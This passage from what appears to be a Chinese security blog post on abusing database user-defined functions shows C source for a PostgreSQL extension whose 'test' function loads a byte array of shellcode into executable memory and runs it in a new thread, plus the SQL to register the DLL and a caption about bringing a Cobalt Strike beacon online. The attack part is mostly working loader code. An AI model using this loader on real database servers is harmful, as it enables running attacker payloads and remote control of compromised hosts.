class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;utils/geo_decls.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add a prototype marked PGDLLEXPORT */</span></span><br><span class="line">PGDLLEXPORT Datum <span class="title function_">test</span><span class="params">(PG_FUNCTION_ARGS)</span>;</span><br><span class="line">PGDLLEXPORT Datum <span class="title function_">pg_exec</span><span class="params">(PG_FUNCTION_ARGS)</span>;</span><br><span class="line">PGDLLEXPORT Datum <span class="title function_">sys_eval</span><span class="params">(PG_FUNCTION_ARGS)</span>;</span><br><span class="line">PGDLLEXPORT Datum <span class="title function_">copytext</span><span class="params">(PG_FUNCTION_ARGS)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PG_FUNCTION_INFO_V1(test);</span><br><span class="line">Datum <span class="title function_">test</span><span class="params">(PG_FUNCTION_ARGS)</span> &#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	DWORD dwThreadId;</span><br><span class="line"></span><br><span class="line">	bytea* shellcode = PG_GETARG_BYTEA_P(<span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> size = VARSIZE(shellcode);</span><br><span class="line">	<span class="type">char</span>* memory = (<span class="type">char</span> *)VirtualAlloc(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		size,</span><br><span class="line">		MEM_COMMIT,</span><br><span class="line">		PAGE_EXECUTE_READWRITE</span><br><span class="line">	);</span><br><span class="line">	CopyMemory(memory, shellcode, size);</span><br><span class="line">	CreateThread(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)memory,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		&amp;dwThreadId</span><br><span class="line">	);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">	PG_RETURN_INT32(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function test(bytea) returns integer as &#x27;e:/1.dll&#x27;,&#x27;test&#x27; language c strict;</span><br></pre></td></tr></table></figure>
+
+<p>上线cs：</p>
+<p><img data-src="https://blog-1254460102.cos.ap-nanjing.myqcloud.com/data/2022/10/01/1c759cbaac1d30f05c06053c64c1da95.png"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/extending-mysql/8.0/en/adding-loadable-function.html">https://dev.mysql.com/doc/extending-mysql/8.0/en/adding-loadable-function.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html">https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/current/xfunc.html">https://www.postgresql.org/docs/current/xfunc.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-postgresql-udf.html?q=postgresql">https://bernardodamele.blogspot.com/2009/01/command-execution-with-postgresql-udf.html?q=postgresql</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.2ndquadrant.com/en/blog/compiling-postgresql-extensions-visual-studio-windows/">https://www.2ndquadrant.com/en/blog/compiling-postgresql-extensions-visual-studio-windows/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/udf/" rel="tag"># udf</a>
+              <a href="/tags/mysql/" rel="tag"># mysql</a>
+              <a href="/tags/postgresql/" rel="tag"># postgresql</a>
+          </div>
+
+        
+
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lzb0t</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":false,"archive":false,"delay":true,"timeout":3000,"priority":true,"tags":false,"url":"http://lzb0t.github.io/2022/09/30/%E6%95%B0%E6%8D%AE%E5%BA%93UDF%E5%85%A5%E9%97%A8%E4%B8%8E%E9%AD%94%E6%94%B9/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
